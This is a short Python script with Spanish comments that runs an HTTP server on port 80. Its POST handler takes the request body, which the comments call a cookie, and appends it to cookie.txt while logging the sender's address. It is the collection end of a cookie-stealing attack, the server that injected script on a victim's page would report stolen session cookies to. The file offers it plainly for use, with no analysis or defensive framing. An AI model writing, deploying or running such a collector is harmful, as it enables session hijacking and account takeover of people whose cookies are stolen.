from http.server import BaseHTTPRequestHandler, HTTPServer
import os

# Configuración del servidor
host = '0.0.0.0'
puerto = 80

# Ruta del archivo de registro
ruta_archivo_log = 'archivo_log.txt'

class ManejadorSolicitud(BaseHTTPRequestHandler):
    def do_POST(self):
        # Obtener el tamaño del contenido (tamaño de la cookie)
        content_length = int(self.headers['Content-Length'])
        # Leer los datos de la solicitud (la cookie)
        cookie_data = self.rfile.read(content_length).decode('utf-8')
        
        # Si la cookie no está vacía, almacenarla en el archivo de cookies
        if cookie_data:
            with open('cookie.txt', 'a') as cookie_file:
                cookie_file.write(cookie_data + '\n')
                
            # Registrar la solicitud en el archivo de registro
            log_line = f"{self.address_string()} - - [{self.log_date_time_string()}] \"POST {self.path}\" 200 -\n"
            with open(ruta_archivo_log, 'a') as archivo:
                archivo.write(log_line)

        # Responder con un código 200 OK
        self.send_response(200)
        self.end_headers()
        self.wfile.write('Solicitud recibida con éxito'.encode('utf-8'))

    def do_GET(self):
        # Responder con un código 200 OK para las solicitudes GET
        self.send_response(200)
        self.end_headers()
        self.wfile.write('Solicitud GET recibida con éxito'.encode('utf-8'))

def iniciar_servidor():
    server_address = (host, puerto)
    httpd = HTTPServer(server_address, ManejadorSolicitud)
    print(f'Servidor HTTP iniciado en http://{host}:{puerto}')

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print('\nDeteniendo el servidor...')
        httpd.server_close()

if __name__ == '__main__':
    iniciar_servidor()
